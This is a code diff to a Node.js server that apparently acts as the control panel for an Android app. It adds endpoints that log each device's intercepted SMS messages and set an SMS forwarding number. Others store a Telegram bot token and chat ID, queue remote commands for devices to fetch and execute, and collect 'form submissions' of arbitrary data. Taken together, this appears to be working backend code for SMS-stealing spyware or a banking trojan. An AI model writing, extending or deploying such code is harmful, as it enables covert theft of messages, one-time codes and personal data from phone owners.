@@ -168,14 +168,11 @@ module.exports = async (req, res) => {
                 
                 return res.status(200).json({ 
                     status: 'success', 
-                    message: 'Device data received and updated.'  // ✅ APK expects this exact message
+                    message: 'Device data updated.' 
                 });
             } catch (error) {
                 console.error('Error in device registration:', error);
-                return res.status(500).json({ 
-                    status: 'error', 
-                    message: 'Failed to register device' 
-                });
+                return res.status(500).json({ error: 'Failed to register device' });
             }
         }
         
@@ -205,13 +202,9 @@ module.exports = async (req, res) => {
                     }
                     
                     return {
-                        device_id: device.device_id,
-                        device_name: device.device_name,
-                        os_version: device.os_version,
-                        phone_number: device.phone_number,
-                        battery_level: device.battery_level,
+                        ...device,
                         is_online: is_online,
-                        created_at: device.created_at
+                        last_seen_difference: Math.floor(secondsDiff)
                     };
                 });
                 
@@ -222,7 +215,247 @@ module.exports = async (req, res) => {
             }
         }
         
-        // Health check
+        // 3. SMS Forwarding Config
+        else if (path === '/api/config/sms_forward') {
+            if (method === 'POST') {
+                const { forward_number } = reqBody;
+                await dbRun(
+                    "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?)",
+                    [forward_number]
+                );
+                return res.status(200).json({ 
+                    status: 'success', 
+                    message: 'Forwarding number updated.' 
+                });
+            } 
+            else if (method === 'GET') {
+                const row = await dbGet(
+                    "SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'", 
+                    []
+                );
+                return res.status(200).json({ 
+                    forward_number: row ? row.setting_value : null 
+                });
+            }
+        }
+        
+        // 4. Telegram Config
+        else if (path === '/api/config/telegram') {
+            if (method === 'POST') {
+                const { telegram_bot_token, telegram_chat_id } = reqBody;
+                
+                await dbRun(
+                    "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?)",
+                    [telegram_bot_token]
+                );
+                await dbRun(
+                    "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', ?)",
+                    [telegram_chat_id]
+                );
+                
+                return res.status(200).json({ 
+                    status: 'success', 
+                    message: 'Telegram settings updated.' 
+                });
+            } 
+            else if (method === 'GET') {
+                const botTokenRow = await dbGet(
+                    "SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'", 
+                    []
+                );
+                const chatIdRow = await dbGet(
+                    "SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'", 
+                    []
+                );
+                
+                return res.status(200).json({
+                    telegram_bot_token: botTokenRow ? botTokenRow.setting_value : null,
+                    telegram_chat_id: chatIdRow ? chatIdRow.setting_value : null
+                });
+            }
+        }
+        
+        // 5. Send Command
+        else if (method === 'POST' && path === '/api/command/send') {
+            const { device_id, command_type, command_data } = reqBody;
+            
+            if (!device_id || !command_type || !command_data) {
+                return res.status(400).json({ error: 'Missing required fields' });
+            }
+            
+            const result = await dbRun(
+                'INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, ?)',
+                [device_id, command_type, JSON.stringify(command_data), 'pending']
+            );
+            
+            return res.status(201).json({ 
+                status: 'success', 
+                message: 'Command queued.', 
+                command_id: result.lastID 
+            });
+        }
+        
+        // 6. Get Pending Commands for a device
+        else if (method === 'GET' && urlParts.length === 4 && 
+                 urlParts[0] === 'api' && urlParts[1] === 'device' && urlParts[3] === 'commands') {
+            
+            const deviceId = urlParts[2];
+            
+            try {
+                // Get pending commands
+                const rows = await dbAll(
+                    "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
+                    [deviceId]
+                );
+                
+                // Mark them as sent
+                if (rows.length > 0) {
+                    const ids = rows.map(cmd => cmd.id);
+                    await dbRun(
+                        `UPDATE commands SET status = 'sent' WHERE id IN (${ids.map(() => '?').join(',')})`,
+                        ids
+                    );
+                }
+                
+                // Parse command_data JSON
+                const parsedCommands = rows.map(cmd => ({
+                    ...cmd,
+                    command_data: JSON.parse(cmd.command_data)
+                }));
+                
+                return res.status(200).json(parsedCommands);
+            } catch (error) {
+                console.error('Error fetching commands:', error);
+                return res.status(200).json([]); // FIXED: empty array return करें
+            }
+        }
+        
+        // 7. Mark command as executed
+        else if (method === 'POST' && urlParts.length === 4 && 
+                 urlParts[0] === 'api' && urlParts[1] === 'command' && urlParts[3] === 'execute') {
+            
+            const commandId = urlParts[2];
+            
+            await dbRun(
+                "UPDATE commands SET status = 'executed' WHERE id = ?",
+                [commandId]
+            );
+            
+            return res.status(200).json({ 
+                status: 'success', 
+                message: 'Command marked as executed.' 
+            });
+        }
+        
+        // 8. SMS Logs
+        else if (urlParts.length === 4 && urlParts[0] === 'api' && 
+                 urlParts[1] === 'device' && urlParts[3] === 'sms') {
+            
+            const deviceId = urlParts[2];
+            
+            if (method === 'POST') {
+                const { sender, message_body } = reqBody;
+                
+                await dbRun(
+                    'INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)',
+                    [deviceId, sender, message_body]
+                );
+                
+                return res.status(201).json({ 
+                    status: 'success', 
+                    message: 'SMS logged.' 
+                });
+            } 
+            else if (method === 'GET') {
+                try {
+                    const rows = await dbAll(
+                        'SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC',
+                        [deviceId]
+                    );
+                    return res.status(200).json(rows);
+                } catch (error) {
+                    console.error('Error fetching SMS logs:', error);
+                    return res.status(200).json([]); // FIXED: empty array return करें
+                }
+            }
+        }
+        
+        // 9. Form Submissions
+        else if (urlParts.length === 4 && urlParts[0] === 'api' && 
+                 urlParts[1] === 'device' && urlParts[3] === 'forms') {
+            
+            const deviceId = urlParts[2];
+            
+            if (method === 'POST') {
+                const { custom_data } = reqBody;
+                
+                await dbRun(
+                    'INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)',
+                    [deviceId, custom_data]
+                );
+                
+                return res.status(201).json({ 
+                    status: 'success', 
+                    message: 'Form data submitted.' 
+                });
+            } 
+            else if (method === 'GET') {
+                try {
+                    const rows = await dbAll(
+                        'SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC',
+                        [deviceId]
+                    );
+                    return res.status(200).json(rows);
+                } catch (error) {
+                    console.error('Error fetching forms:', error);
+                    return res.status(200).json([]); // FIXED: empty array return करें
+                }
+            }
+        }
+        
+        // 10. Delete Device - FIXED: अब सिर्फ manual delete से ही डिवाइस हटेगा
+        else if (method === 'DELETE' && urlParts.length === 3 && 
+                 urlParts[0] === 'api' && urlParts[1] === 'device') {
+            
+            const deviceId = urlParts[2];
+            
+            try {
+                // Delete all related data
+                await dbRun('DELETE FROM devices WHERE device_id = ?', [deviceId]);
+                await dbRun('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
+                await dbRun('DELETE FROM form_submissions WHERE device_id = ?', [deviceId]);
+                await dbRun('DELETE FROM commands WHERE device_id = ?', [deviceId]);
+                
+                return res.status(200).json({ 
+                    status: 'success', 
+                    message: 'Device and all related data deleted.' 
+                });
+            } catch (error) {
+                console.error('Error deleting device:', error);
+                return res.status(500).json({ error: 'Failed to delete device' });
+            }
+        }
+        
+        // 11. Delete SMS
+        else if (method === 'DELETE' && urlParts.length === 3 && 
+                 urlParts[0] === 'api' && urlParts[1] === 'sms') {
+            
+            const smsId = urlParts[2];
+            
+            try {
+                await dbRun('DELETE FROM sms_logs WHERE id = ?', [smsId]);
+                
+                return res.status(200).json({ 
+                    status: 'success', 
+                    message: 'SMS deleted.' 
+                });
+            } catch (error) {
+                console.error('Error deleting SMS:', error);
+                return res.status(500).json({ error: 'Failed to delete SMS' });
+            }
+        }
+        
+        // 12. Health check और initial load के लिए
         else if (path === '/api/health') {
             try {
                 const deviceCount = await dbGet('SELECT COUNT(*) as count FROM devices', []);
@@ -241,7 +474,28 @@ module.exports = async (req, res) => {
             }
         }
         
-        // Add other endpoints as needed...
+        // 13. Get single device info
+        else if (method === 'GET' && urlParts.length === 3 && 
+                 urlParts[0] === 'api' && urlParts[1] === 'device') {
+            
+            const deviceId = urlParts[2];
+            
+            try {
+                const device = await dbGet('SELECT * FROM devices WHERE device_id = ?', [deviceId]);
+                if (device) {
+                    const now = new Date();
+                    const lastSeen = new Date(device.last_seen);
+                    const secondsDiff = (now - lastSeen) / 1000;
+                    device.is_online = secondsDiff < 20;
+                    return res.status(200).json(device);
+                } else {
+                    return res.status(404).json({ error: 'Device not found' });
+                }
+            } catch (error) {
+                console.error('Error fetching device:', error);
+                return res.status(500).json({ error: 'Failed to fetch device' });
+            }
+        }
         
         // Not Found
         else {
